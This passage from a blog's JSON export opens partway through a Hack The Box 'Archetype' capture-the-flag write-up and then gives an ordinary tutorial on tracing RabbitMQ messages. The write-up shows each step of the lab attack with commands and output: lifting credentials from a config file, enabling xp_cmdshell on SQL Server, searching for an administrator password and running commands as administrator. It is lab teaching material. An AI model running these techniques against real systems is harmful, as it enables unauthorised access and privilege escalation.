4096. 8253724 blocks available \\n```\\n\\nI found that there\u2019s some type of configuration file named \u2018prod.dtsConfig\u2018 there. To read its contents, I used the following command:\\n\\n```bash\\nsmb: \\\\> more prod.dtsConfig\\n```\\n\\n```markup\\n<DTSConfiguration>                                                                                                                     \\n    <DTSConfigurationHeading>                                                                                                          \\n        <DTSConfigurationFileInfo GeneratedBy=\\"...\\" GeneratedFromPackageName=\\"...\\" GeneratedFromPackageID=\\"...\\" GeneratedDate=\\"20.1.201\\n9 10:01:34\\"/>                                                                                                                          \\n    </DTSConfigurationHeading>                                                                                                         \\n    <Configuration ConfiguredType=\\"Property\\" Path=\\"\\\\Package.Connections[Destination].Properties[ConnectionString]\\" ValueType=\\"String\\"> \\n        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Pers\\nist Security Info=True;Auto Translate=False;</ConfiguredValue>                                                                         \\n    </Configuration>                                                                                                                   \\n</DTSConfiguration>\\n```\\n\\nLooks like we got some valuable information in this XML file. We can see in the `ConfiguredData` node that we have credentials which seem to belong to the SQL Server service:\\n\\n```markup\\n<ConfiguredValue>...;Password=M3g4c0rp123;User ID=ARCHETYPE\\\\sql_svc;...</ConfiguredValue>\\n```\\n\\nWe know from the initial scan that there\u2019s an SQL Server running on the machine and we now have credentials to access it.\\n\\n## Connecting to SQL Server\\n\\nIn order to start working on SQL Server, I needed a client to connect to it and execute some commands there.\\nI found [`dbcli/mssql-cli`](https://github.com/dbcli/mssql-cli). I installed it using the `pip` Python package manager and then attempted connecting to the MSSQL service using the credentials we found earlier:\\n\\n```bash\\npip3 install mssql-cli\\n\\nmssql-cli -S $ip -U $username -P $password\\nError message: Login failed for user \'ARCHETYPE/sql_svc\'.\\n```\\n\\nTo get some more information about the login failure, I needed to look at the logic within the `mssqlcli` main module. I found it by searching the filesystem:\\n\\n```bash\\nsudo find / -wholename \\"*mssqlcli/main.py\\" 2&> /dev/null\\n~/.local/lib/python3.8/site-packages/mssqlcli/main.py\\n```\\n\\nI managed to find a way to increase the verbosity so I have more information about the source of the error by using the `--enable-sqltoolsservice-logging` command line option. This revealed a `NullReference` exception thrown from some C# logger class (which is likely a red-haring) and another exception coming from MSSQL connection service:\\n\\n```bash\\nmssql-cli -S $ip -U $username -P $password --enable-sqltoolsservice-logging\\n \\nUnhandled Exception: System.NullReferenceException: Object reference not set to an instance of an object.\\n   at Microsoft.SqlTools.Utility.Logger.Close() in D:\\\\a\\\\1\\\\s\\\\src\\\\Microsoft.SqlTools.Hosting\\\\Utility\\\\Logger.cs:line 79\\n   at Microsoft.SqlTools.ServiceLayer.Program.Main(String[] args) in D:\\\\a\\\\1\\\\s\\\\src\\\\Microsoft.SqlTools.ServiceLayer\\\\Program.cs:line 27\\nTraceback (most recent call last):\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py\\", line 51, in get_response\\n    response = self.json_rpc_client.get_response(self.request_id, self.owner_uri)\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py\\", line 84, in get_response\\n    raise self.exception_queue.get()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py\\", line 124, in _listen_for_response\\n    response = self.reader.read_response()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py\\", line 272, in read_response\\n    while (not self.needs_more_data or self.read_next_chunk()):\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py\\", line 326, in read_next_chunk\\n    raise EOFError(u\'End of stream reached, no output.\')\\nEOFError: End of stream reached, no output.\\n \\nDuring handling of the above exception, another exception occurred:\\n \\nTraceback (most recent call last):\\n  File \\"/usr/lib/python3.8/runpy.py\\", line 194, in _run_module_as_main\\n    return _run_code(code, main_globals, None,\\n  File \\"/usr/lib/python3.8/runpy.py\\", line 87, in _run_code\\n    exec(code, run_globals)\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/main.py\\", line 122, in <module>\\n    main()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/main.py\\", line 115, in main\\n    run_cli_with(mssqlcli_options)\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/main.py\\", line 52, in run_cli_with\\n    mssqlcli.connect_to_database()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/mssql_cli.py\\", line 278, in connect_to_database\\n    owner_uri, error_messages = self.mssqlcliclient_main.connect_to_database()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py\\", line 91, in connect_to_database\\n    owner_uri, error_messages = self._execute_connection_request_with(connection_params)\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py\\", line 180, in _execute_connection_request_with\\n    response = connection_request.get_response()\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py\\", line 67, in get_response\\n    return self.response_error(error)\\n  File \\"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/connectionservice.py\\", line 22, in response_error\\n    u\'ownerUri\': cls.owner_uri,\\nAttributeError: type object \'ConnectionRequest\' has no attribute \'owner_uri\'\\n```\\n\\nI decided that I had wasted enough time debugging a third party library when there are so many other out there that do the same operation. After all, I wanted to capture the flag in an efficient as time as possible. Therefore, I decided to try [`impacket`](https://github.com/SecureAuthCorp/impacket).\\nInstallation was done using `pip`:\\n\\n```bash\\npip install impacket\\n```\\n\\nAnd used the documentation to run the following command to connect to SQL Server but I received some unknown error which seemed to originate from switching to TLS:\\n\\n```bash\\nmssqlclient.py $username:$password@$ip\\nImpacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation\\n \\nPassword:\\n[*] Encryption required, switching to TLS\\n[-] [(\'SSL routines\', \'state_machine\', \'internal error\')]\\n```\\n\\nI found that I could get more information by specifying the `-debug` flag which provided the stacktrace:\\n\\n```bash\\nmssqlclient.py $username:$password@$ip -debug\\nImpacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation\\n \\n[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket\\nPassword:\\n[*] Encryption required, switching to TLS\\n[+] Exception:\\nTraceback (most recent call last):\\n  File \\"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/EGG-INFO/scripts/mssqlclient.py\\", line 179, in <module>\\n    res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)\\n  File \\"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py\\", line 917, in login\\n    tls.do_handshake()\\n  File \\"/usr/lib/python3/dist-packages/OpenSSL/SSL.py\\", line 1915, in do_handshake\\n    self._raise_ssl_error(self._ssl, result)\\n  File \\"/usr/lib/python3/dist-packages/OpenSSL/SSL.py\\", line 1647, in _raise_ssl_error\\n    _raise_current_error()\\n  File \\"/usr/lib/python3/dist-packages/OpenSSL/_util.py\\", line 54, in exception_from_error_queue\\n    raise exception_type(errors)\\nOpenSSL.SSL.Error: [(\'SSL routines\', \'state_machine\', \'internal error\')]\\n[-] [(\'SSL routines\', \'state_machine\', \'internal error\')]\\n```\\n\\nFrom the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.\\nDoing some research, I found that [this problem](https://github.com/SecureAuthCorp/impacket/issues/856) also happened to other people and someone had found [a solution by modifying the TLS version from v1 to v2](https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208). I performed the same changes in the `~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py` and reran the same command:\\n\\n```bash\\nmssqlclient.py $username:$password@$ip -debug\\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\\n \\n[*] Encryption required, switching to TLS\\n[-] ERROR(ARCHETYPE): Line 1: Login failed for user \'sql_svc\'.\\n```\\n\\nThis time around I got a different error message, a failed login with the user `sql_svc`. I found a way around that by specifying the `-windows-auth` flag which enables using [Kerberos\\\\Windows authentication](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication):\\n\\n```bash\\nmssqlclient.py $username:$password@$ip -windows-auth\\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\\n \\n[*] Encryption required, switching to TLS\\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\\n[*] INFO(ARCHETYPE): Line 1: Changed database context to \'master\'.\\n[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.\\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) \\n[!] Press help for extra shell commands\\nSQL> \\n```\\n\\nI had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this.\\n\\n## Running System Commands from SQL Server Shell\\n\\nReading through official Microsoft documentation, I found that we can actually [run system commands from within SQL Server using the `xp_cmdshell`](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15). This is exactly what I was looking for as it enabled me to be able to interact with the remote target system. When I attempted to run this cmdlet, I received the following error:\\n\\n```bash\\nSQL> xp_cmdshell \\"echo test\\"\\n \\n[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure \'sys.xp_cmdshell\' of component \'xp_cmdshell\' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \'xp_cmdshell\' by using sp_configure. For more information about enabling \'xp_cmdshell\', search for \'xp_cmdshell\' in SQL Server Books Online.\\n```\\n\\nSeems that we need to enable the use of the command somehow. Reading the [Microsoft documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15#remarks) in greater depth, I found that the cmdlet is disabled by default. It also gave me the information I needed in order to enable it:\\n\\n> `xp_cmdshell` is a very powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`. For more information, see [Surface Area Configuration](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration?view=sql-server-ver15) and [`xp_cmdshell` Server Configuration Option](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15).\\n\\nI ran the following command to enable it:\\n\\n```bash\\nsp_configure \'xp_cmdshell\', 1\\n[*] INFO(ARCHETYPE): Line 185: Configuration option \'xp_cmdshell\' changed from 0 to 1. Run the RECONFIGURE statement to install.\\n```\\n\\nI then ran `reconfigure` as requested. I was now able to run any commands on the machine.\\nSince I speak a little bit of Batch, I ran a command to see which directory we\u2019re currently in:\\n\\n```bash\\nSQL> xp_cmdshell \\"echo The current directory is %CD%\\"\\noutput                                                                             \\n \\n--------------------------------------------------------------------------------   \\n \\nThe current directory is C:\\\\Windows\\\\system32                                       \\nSQL>whoami\\noutput                                                                             \\n \\n--------------------------------------------------------------------------------   \\n \\narchetype\\\\sql_svc \\n```\\n\\nLooks like the user we\u2019re currently logged in with `sql_svc` who can run remote commands on the system. So now all that is left is to read the contents of the user flag in the desktop:\\n\\n```bash\\nSQL> xp_cmdshell \\"type c:\\\\Users\\\\sql_svc\\\\Desktop\\\\user.txt\\"\\noutput                                                                             \\n \\n--------------------------------------------------------------------------------   \\n \\n3e7b102e78218e935bf3f4951fec21a3\\n```\\n\\nI was delighted at this point. But still had my eyes to the second and more challenging part: retrieve the administrator\u2019s flag.\\nI attempted to access the path where the flag is located but unfortunately I could not access it:\\n\\n```bash\\nSQL> xp_cmdshell \\"cd c:\\\\Users\\\\Administrator\\\\Desktop\\"\\noutput                                                                             \\n \\n--------------------------------------------------------------------------------   \\nAccess is denied.\\n```\\n\\nI decided, since I had access to the C: drive, it was worth to do a recursive search in the drive to see if we can find the word \u201cadministrator\u201d in some file (since we know that only the administrator account can access the flag on its desktop):\\nI spawned a new PowerShell process and ran the following command only to be stopped because of denial to search in a particular path (The Event Viewer logs):\\n\\n```powershell\\nSQL>xp_cmdshell \\"powershell \\"Get-ChildItem -Recurse | Select-String administrator -List | Select Path\\"\\"\\n \\nSelect-String : The file C:\\\\Windows\\\\system32\\\\winevt\\\\Logs\\\\Windows PowerShell.evtx cannot be read: Access to the path    \\n \\n\'C:\\\\Windows\\\\system32\\\\winevt\\\\Logs\\\\Windows PowerShell.evtx\' is denied.               \\n \\nAt line:1 char:26                                                                  \\n \\n+ Get-ChildItem -Recurse | Select-String administrator -List | Select P ...        \\n \\n+                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       \\n \\n    + CategoryInfo          : InvalidArgument: (:) [Select-String], ArgumentException   \\n \\n    + FullyQualifiedErrorId : ProcessingFile,Microsoft.PowerShell.Commands.SelectStringCommand   \\n```\\n\\nI altered the command a bit and added the flag `-ErrorAction SilentlyContinue` to prevent the script from from stopping. Let me break down each part to explain what it\u2019s intended to do.\\nThe first part retrieves all files and directories from the `sql_svc` home folder recursively. [The `-File` flag ensures the cmdlet only returns files. The `-Force` flag is important here because it searches for all files (even hidden ones)](https://superuser.com/questions/150748/have-powershell-get-childitem-return-files-only):\\n\\n```powershell\\nGet-ChildItem -Path C:\\\\Users\\\\sql_svc -Recurse -Force -ErrorAction SilentlyContinue -File\\n```\\n\\nWe then pipe the list of all files and folders into the following command:\\n\\n```powershell\\nGet-Content -ErrorAction SilentlyContinue\\n```\\n\\nThis will read the contents of each file that was piped into the command and print it to the console.\\nThe last part of the command performs a case-insensitive search for the word \u2018administrator\u2019 in all the piped content:\\n\\n```powershell\\nSelect-String administrator -ErrorAction SilentlyContinue\\n```\\n\\nPutting it all together and displaying the output, we see that one of the files that was read had a command that included the word \u2018administrator\u2019!\\n\\n```powershell\\nSQL> xp_cmdshell \\"powershell \\"Get-ChildItem -Path C:\\\\Users\\\\sql_svc -Recurse -Force -ErrorAction SilentlyContinue | Get-Content -ErrorAction SilentlyContinue| Select-String administrator -ErrorAction SilentlyContinue\\"\\"\\n \\noutput                                                                             \\n \\n--------------------------------------------------------------------------------   \\nnet.exe use T: \\\\\\\\Archetype\\\\backups /user:administrator MEGACORP_4dm1n!!            \\n```\\n\\nThe command [maps the T drive to the backups share using the administrator account](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)). And we can see that the last argument includes the administrator password!\\nAll that\u2019s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.\\nThe attempt for the former failed:\\n\\n```bash\\nmssqlclient.py ARCHETYPE/administrator:MEGACORP_4dm1n\\\\!\\\\!@$ip -windows-auth\\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\\n \\n[*] Encryption required, switching to TLS\\n[-] ERROR(ARCHETYPE): Line 1: Login failed for user \'ARCHETYPE\\\\administrator\'.\\n```\\n\\nThis is because there\u2019s no such user in the database (logged in with `sql_svc` user):\\n\\n```sql\\nSQL> SELECT name FROM sys.database_principals\\n\\nname\\n \\npublic\\ndbo\\nguest\\nINFORMATION_SCHEMA\\nsys\\n##MS_PolicyEventProcessingLogin##\\n##MS_AgentSigningCertificate##\\ndb_owner\\ndb_accessadmin\\ndb_securityadmin \\ndb_ddladmin\\ndb_backupoperator\\ndb_datareader\\ndb_datawriter\\ndb_denydatareader\\ndb_denydatawriter                               \\n```\\n\\nSo I needed to try the latter approach: run the command to read the flag as administrator.\\nI did some research and found [a way to do this using PowerShell](https://superuser.com/a/1421775/506517). I ran the following command to specify the administrator credentials and print the contents of the flag:\\n\\n```sql\\nSQL> xp_cmdshell \\"powershell \\"$username=\\\\\\"administrator\\\\\\";$password=\\\\\\"MEGACORP_4dm1n!!\\\\\\";$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Invoke-Command -ComputerName \\\\\\"Archetype\\\\\\" -Credential $Cred -ScriptBlock {Get-Content C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt} \\"\\"\\n\\noutput                                                                             \\n \\nb91ccec3305e98240082d4474b848528\\n```"},{"id":"how-to-trace-read-rabbitmq-messages","metadata":{"permalink":"/blog/how-to-trace-read-rabbitmq-messages","source":"@site/blog/how-to-trace-read-rabbitmq\xa0messages.md","title":"How To Trace/Read RabbitMQ\xa0Messages","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Debugging","permalink":"/blog/tags/debugging"},{"inline":false,"label":"Docker","permalink":"/blog/tags/docker"},{"inline":false,"label":"Kubernetes","permalink":"/blog/tags/kubernetes"},{"inline":false,"label":"Rabbitmq","permalink":"/blog/tags/rabbitmq"},{"inline":false,"label":"Trace","permalink":"/blog/tags/trace"}],"readingTime":7.335,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"how-to-trace-read-rabbitmq-messages","title":"How To Trace/Read RabbitMQ\xa0Messages","description":"Fill me up!","authors":["kbbgl"],"tags":["debugging","docker","kubernetes","rabbitmq","trace"],"image_url":"https://tilsupport.files.wordpress.com/2021/04/1_unyl-2r54_7anewqv0cvxa.png"},"unlisted":false,"prevItem":{"title":"Hack The Box \u2018Archetype\u2019 Challenge","permalink":"/blog/hack-the-box-archetype-challenge"},"nextItem":{"title":"Installing PiHole On Raspberry Pi 4, MicroK8s running Ubuntu 20.04\xa0(focal)","permalink":"/blog/install-pihole-rpi4-microk8s-ubuntu-2004"}},"content":"## Introduction\\n\\nThis week, I needed to debug a production issue where one of the critical ReactJS applications happened to load exactly after 60 seconds.\\n\\n\x3c!-- truncate --\x3e\\n\\nWhen I opened the browser development tools network tab, I saw that the request was stuck in Pending state indicating that it was waiting for the server to respond.\\n\\nAs I am already quite familiar with the relevant GraphQL server which works as a backend for this ReactJS application, I knew that the constant 60 seconds response time was no coincidence. It was a hardcoded RabbitMQ RPC (Remote Procedure Call) timeout which is configured systemwide. This means that any microservice in the cluster has 60 seconds to respond to the RPC, and if it doesn\u2019t do so by that interval, the message is dropped. In order to further debug the issue, I needed to somehow figure out which RPC call was stuck as neither the RabbitMQ or the GraphQL services DEBUG/TRACE logs had printed information about these RPCs.\\n\\n![broker](https://www.cloudamqp.com/img/blog/workflow-rabbitmq.png)\\n\\nMicroservices use the RabbitMQ message broker to transfer messages between them. These messages, when consumed by the destination service, will [`ACK`](https://developer.mozilla.org/en-US/docs/Glossary/TCP_handshake) with a response message to the service which requested the information. Once the reply was accepted by the requesting service, the message is deleted from the queue.\\n\\n![queue](https://www.cloudamqp.com/img/blog/exchanges-bidings-routing-keys.png)\\n\\nIn some cases, such as investigation of this issue, we would need to be able to review which messages were published and consumed in the RabbitMQ message broker prior to deletion.\\n\\nThis tutorial will explain how to enable message tracing to be able to review the messages published and consumed. It was created because I found it very frustrating that the official RabbitMQ documentation for this feature and its relevant plugin were unclear, not up-to-date and not procedural.\\n\\n## Disclaimer for Performance Degradation\\n\\nEnabling message tracing is a very costly operation and increases the processing and memory consumption of the [`erl`](https://www.erlang.org/doc/man/erl.html) process/RabbitMQ container.\\n\\nYou might need to increase the [RabbitMQ memory watermark](https://www.rabbitmq.com/memory.html#threshold) and/or the RabbitMQ container memory/CPU limits in the environment where you\u2019re debugging. It is mandatory to clean up thereafter (see last section on how to do so).\\n\\nThe environment where this issue was occurring was in an Ubuntu server running a Kubernetes 3-node cluster where the RabbitMQ container was running as a ClusterIP Service (which means it\u2019s only exposed to internally). With some minor modifications, it could also be tweaked to be relevant for Windows environments.\\n\\nFollow [these instruction\xa0on how to set up `rabbitmqadmin` for Windows environments](https://www.rabbitmq.com/management-cli.html).\\n\\n## Configuration (Optional)\\n\\nWe can create a configuration file which we will use to authenticate the commands we\u2019ll send to the RabbitMQ service. This will save us some time as we won\u2019t need to specify mandatory arguments for every command we type and can use the configuration file instead which will include these arguments.\\nOne of the mandatory arguments is the IP where the RabbitMQ service is running. We can retrieve the IP by running the following command:\\n\\n```bash\\nkubectl get endpoints rabbitmq-ha -n prod -o=jsonpath=\'{.subsets[0].addresses[0].ip}\'\\n \\n192.168.1.15\\n```\\n\\nLet\u2019s create a configuration file:\\n\\n```bash\\ncat <<EOT >> /tmp/rmq.conf\\n# Name of instance we want to connect to\\n[instance]\\n \\n# Host/IP where the RabbitMQ server is running\\nhostname = 192.168.1.15\\n \\n# RabbitMQ credentials\\nusername = YOUR_UN\\npassword = YOUR_PW\\nEOT\\nnano \\n```\\n\\nInside the text editor, specify the following:\\n\\nNotice that the file follows the [Python INI configuration](https://docs.python.org/3/library/configparser.html#supported-ini-file-structure) format. This is because `rabbitmqadmin` is written in Python.\\n\\n## Enabling Tracing Plugin\\n\\nRabbitMQ ships by default with a plugin called `rabbitmq_tracing`.\\nTo enable it, we run the following command:\\n\\n```bash\\nkubectl exec rabbitmq-ha-0 -c rabbitmq-ha -n prod -- rabbitmq-plugins enable rabbitmq_tracing\\n```\\n\\nWe can verify that the plugin was enabled by running:\\n\\n```bash\\nkubectl exec rabbitmq-ha-0 -c rabbitmq-ha -n prod -- rabbitmq-plugins list\\n```\\n\\nEnabling the `rabbitmq_tracing` plugin creates a new exchange named `amq.rabbitmq.trace` where all messages sent to the vhost will be forwarded to.\\n\\n## Getting `rabbitmqadmin` Binary\\n\\nIn order to read the forwarded messages, we would need to create a new queue where all messages will be sent to and bind this new queue to the `amq.rabbitmq.trace` exchange.\\n\\nThe fastest way to do this is using the `rabbitmqadmin` command line tool.\\n\\nWe can download it from different locations but the best place is from the container itself as it will pair with the exact version of the RabbitMQ server running in the container. To copy the binary to the host machine, we run the following command:\\n\\n```bash\\nkubectl cp rabbitmq-ha-0:/var/lib/rabbitmq/mnesia/rabbit@rabbitmq-ha-0.rabbitmq-ha-discovery.prod.svc.cluster.local-plugins-expand/rabbitmq_management-$VERSION/priv/www/cli/rabbitmqadmin -c rabbitmq-ha ~/rabbitmqadmin\\n```\\n\\nThis will download the `rabbitmqadmin` command line tool to the home (~) directory.\\nIt\u2019s worth to keep in mind that the path might be different in other deployments as this tutorial was tested with a specific RabbitMQ version (represented by `$VERSION`).\\n\\nTo use the `rabbitmqadmin` tool, we need to either (a) specify the configuration file path created in the [Configuration section](#configuration-optional) or (b) the command line arguments for the host, user and password alongside the rest of the commands.\\n\\nOption (a) will be used for the remainder of the document but if you insist on not creating a configuration file, you can also run the commands in the following format:\\n\\n```bash\\nip=$(kubectl get endpoints -n prod rabbitmq-ha -o=jsonpath=\'{.subsets[0].addresses[0].ip}\')\\nrabbitmqadmin -H $ip -u YOUR_USERNAME -p YOUR_PASSWORD ...[rest of commands]\\n```\\n\\n## Creating RabbitMQ Resources and Bindings\\n\\nNow that we have the tool to use to interact with the RabbitMQ cluster, we need to do two things before we\u2019re able to read the RPC messages:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance declare queue name=debug\\n```\\n\\n2. Bind the debug queue to the exchange `amq.rabbitmq.trace`. To do this, run the following command:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance declare binding source=amq.rabbitmq.trace destination=debug routing_key=#\\n```\\n\\nThe `routing_key=#` parameter ensures that we forward all published, delivered and consumed messages across queues and exchanges to the bound debug queue.\\n\\n## Reading Messages\\n\\nNow that all messages are set up to be forwarded to queue debug, we can see how many there are. In the example below we have 317 messages:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance get queue=debug\\n+-------------+--------------------+---------------+---------+---------------+------------------+-------------+\\n| routing_key |      exchange      | message_count | payload | payload_bytes | payload_encoding | redelivered |\\n+-------------+--------------------+---------------+---------+---------------+------------------+-------------+\\n| publish.    | amq.rabbitmq.trace | 317           | {}      | 2             | string           | False       |\\n+-------------+--------------------+---------------+---------+---------------+------------------+-------------+\\n```\\n\\nWe can also read the actual payload. Here we specify to read the first 5 (includes only the headers, not actual data):\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance get queue=debug count=5\\n \\n+--------------------------------------+--------------------+---------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------------+-------------+\\n|             routing_key              |      exchange      | message_count |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | payload_bytes | payload_encoding | redelivered |\\n+--------------------------------------+--------------------+---------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------------+-------------+\\n|...\\n```\\n\\nA better way to see the messages would be to connect to the queue as a consumer. We can do this faily easily by using the [`pika` Python library](https://pika.readthedocs.io/en/stable/).\\nWe first need to install it:\\n\\n```bash\\npip install pika\\n```\\n\\nThen we can use the following script `receive.py` to connect to it:\\n\\n```python\\n#!/usr/bin/env python\\nimport pika, sys, os\\n \\ndef main():\\n    cred = pika.PlainCredentials(username=YOUR_USER, password=YOUR_PASSWORD)\\n    connection = pika.BlockingConnection(pika.ConnectionParameters(host=\'192.168.1.15\', credentials=cred))\\n    channel = connection.channel()\\n \\n    channel.queue_declare(queue=\'debug\', durable=True)\\n \\n    def callback(ch, method, properties, body):\\n         \\n        print(\\" [x] Received method \'{}\', body {}\\".format(method.routing_key, body.decode()))\\n \\n    channel.basic_consume(queue=\'debug\', on_message_callback=callback, auto_ack=True)\\n \\n    print(\' [*] Waiting for messages. To exit press CTRL+C\')\\n    channel.start_consuming()\\n \\nif __name__ == \'__main__\':\\n    try:\\n        main()\\n    except KeyboardInterrupt:\\n        print(\'Interrupted\')\\n        try:\\n            sys.exit(0)\\n        except SystemExit:\\n            os._exit(0)\\n```\\n\\nKeep in mind that you need to change the `YOUR_USER` and `YOUR_PASSWORD` values (as well as the `host=IP`) according to your credentials/address.\\n\\nWe can then run the script to begin consuming the messages:\\n\\n```bash\\nchmod u+x receive.py\\n./receive.py\\n \\n[x] Received u\'{...}\'\\n```\\n\\nThis is the stage where we would use the payload to troubleshoot our issue. In the specific case I was debugging, we found that the environment had an RPC timeout because of a very large database query to retrieve data for thousands of resources created in the application. We recommended a scaling solution to resolve it.\\n\\n## Cleanup\\n\\nCreating the debug queue without consumers means that the messages will get stuck there forever. This could lead to increase in server/container resources, specifically RAM, disk and CPU and in turn, to severe application performance degradation. Thererfore, it\u2019s required to erase all created resources before terminating the session.\\n\\nWe first need to remove the binding between the exchange and the queue to stop forwarding messages to the queue. To do this, we run the following command:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance delete binding source=amq.rabbitmq.trace destination=debug destination_type=queue properties_key=\\"#\\"\\nbinding deleted\\n```\\n\\nNext step is to purge (i.e. delete/remove) all the messages in the debug queue:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance purge queue name=debug\\nqueue purged\\n```\\n\\nDelete the debug queue:\\n\\n```bash\\nrabbitmqadmin -c /tmp/rmq.conf -N instance delete queue name=debug\\nqueue deleted\\n```\\n\\nAnd finally, disable the `rabbitmq_tracing` plugin to remove the `amq.rabbitmq.trace` exchange:\\n\\n```bash\\nkubectl exec rabbitmq-ha-0 -c rabbitmq-ha -n prod -- rabbitmq-plugins disable rabbitmq_tracing\\n```"},{"id":"install-pihole-rpi4-microk8s-ubuntu-2004","metadata":{"permalink":"/blog/install-pihole-rpi4-microk8s-ubuntu-2004","source":"@site/blog/install-pihole-rpi4-microk8s-ubuntu-2004.md","title":"Installing PiHole On Raspberry Pi 4, MicroK8s running Ubuntu 20.04\xa0(focal)","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Docker","permalink":"/blog/tags/docker"},{"inline":false,"label":"How-to","permalink":"/blog/tags/how-to"},{"inline":false,"label":"K8s","permalink":"/blog/tags/k-8-s"},{"inline":false,"label":"Kubernetes","permalink":"/blog/tags/kubernetes"},{"inline":false,"label":"Linux","permalink":"/blog/tags/linux"},{"inline":false,"label":"Pihole","permalink":"/blog/tags/pihole"},{"inline":false,"label":"Raspberry_pi","permalink":"/blog/tags/raspberry-pi"},{"inline":false,"label":"Troubleshooting","permalink":"/blog/tags/troubleshooting"}],"readingTime":16.835,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"install-pihole-rpi4-microk8s-ubuntu-2004","title":"Installing PiHole On Raspberry Pi 4, MicroK8s running Ubuntu 20.04\xa0(focal)","description":"Fill me 